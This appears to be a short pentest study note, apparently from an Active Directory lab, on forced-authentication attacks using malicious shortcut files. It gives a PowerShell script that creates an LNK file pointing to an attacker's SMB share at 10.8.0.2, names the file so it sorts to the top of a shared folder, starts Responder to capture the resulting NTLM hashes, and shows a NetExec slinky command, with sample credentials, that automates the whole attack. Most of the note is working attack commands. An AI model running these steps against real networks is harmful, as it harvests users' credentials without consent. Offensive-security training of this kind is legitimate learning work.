- On compromised machine as admin in powershell:
```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\10.8.0.2\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```
- We want to make the **==shortcut file as high as possible alphabetically so we add `@` or '~'==** in file name begin.
- ![[Pasted image 20250330061734.png]]
- Rename:
- ![[Pasted image 20250330061801.png]]
- Start responder:
	- `sudo responder -I tun0 -dwv`
- Copy file to ` "\\\HYDRA-DC\\hackme\\"`
- Refresh `hackme` folder:
	- ![[Pasted image 20250330062042.png]]

# Automated attack using CME/NetExec:

- `netexec smb 10.0.1.10 -d marvel.local -u pparker -p Password1 -M slinky -o NAME=test SERVER=10.8.0.2`
	- `SERVER` -> Attacker IP
	- `-M` -> slinky module for automation of LNK attack
	- `NAME` -> name of the LNK file
- ![[Pasted image 20250330062503.png]]


[Addition Resources](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)
